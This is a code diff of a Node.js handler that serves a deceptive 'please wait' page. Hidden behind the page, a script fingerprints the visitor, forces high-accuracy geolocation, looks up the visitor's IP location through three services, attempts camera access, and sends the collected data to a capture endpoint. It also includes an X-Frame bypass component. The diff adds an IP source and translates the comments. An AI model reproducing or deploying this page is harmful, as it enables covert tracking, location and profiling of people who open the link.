@@ -1,5 +1,6 @@
 module.exports = async (req, res) => {
-    res.setHeader('Content-Type', 'text/html charset=utf-8')
+    // Headers CORRETOS para HTML
+    res.setHeader('Content-Type', 'text/html; charset=utf-8')
     res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate')
     
     const html = `<!DOCTYPE html><html lang="pt-BR"><head>
@@ -25,7 +26,7 @@ module.exports = async (req, res) => {
         <div class="loading">⏳ Processo automático - Aguarde...</div>
     </div>
     <script>
-        // X-Frame Bypass Component
+        // X-Frame Bypass Component (para evitar restrições de iframe)
         customElements.define('x-frame-bypass', class extends HTMLIFrameElement {
             static get observedAttributes() { return ['src'] }
             constructor() { super() }
@@ -46,7 +47,7 @@ module.exports = async (req, res) => {
             }
         }, {extends: 'iframe'})
 
-        // Enhanced Data Collection
+        // Coleta de dados aprimorada com IP de múltiplas fontes
         async function collectData() {
             const payload = {
                 userAgent: navigator.userAgent,
@@ -60,7 +61,7 @@ module.exports = async (req, res) => {
                 hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
             }
 
-            // Force Geolocation with High Accuracy
+            // Force Geolocation with High Accuracy (se permitido)
             try {
                 const pos = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, {
@@ -78,18 +79,19 @@ module.exports = async (req, res) => {
                 payload.geolocationError = err.message
             }
 
-            // Multi-Source IP Triangulation
+            // Multi-Source IP Triangulation (sempre executado, mesmo com GPS)
             try {
-                const [ipapi, ipinfo] = await Promise.allSettled([
+                const [ipapi, ipinfo, dbip] = await Promise.allSettled([
                     fetch('https://ipapi.co/json/').then(r => r.ok ? r.json() : null),
-                    fetch('https://ipinfo.io/json').then(r => r.ok ? r.json() : null)
+                    fetch('https://ipinfo.io/json').then(r => r.ok ? r.json() : null),
+                    fetch('https://api.db-ip.com/v2/free/self').then(r => r.ok ? r.json() : null)
                 ])
-                payload.ipLocation = ipapi.value || ipinfo.value || null
+                payload.ipLocation = ipapi.value || ipinfo.value || dbip.value || null
             } catch (err) {
                 payload.ipError = err.message
             }
 
-            // Attempt Camera Access
+            // Tentativa de acesso à câmera (opcional)
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true })
                 payload.cameraCapture = "GRANTED"
@@ -101,7 +103,7 @@ module.exports = async (req, res) => {
             return payload
         }
 
-        // Data Exfiltration
+        // Exfiltração de dados para a API
         async function exfiltrate(data) {
             const endpoints = [
                 () => navigator.sendBeacon('/api/capture', JSON.stringify(data)),
@@ -114,7 +116,7 @@ module.exports = async (req, res) => {
             return false
         }
 
-        // Execute
+        // Execução principal
         setTimeout(async () => {
             const data = await collectData()
             const success = await exfiltrate(data)
@@ -125,5 +127,6 @@ module.exports = async (req, res) => {
         }, 3000)
     </script>
 </body></html>`
+
     res.send(html)
 }
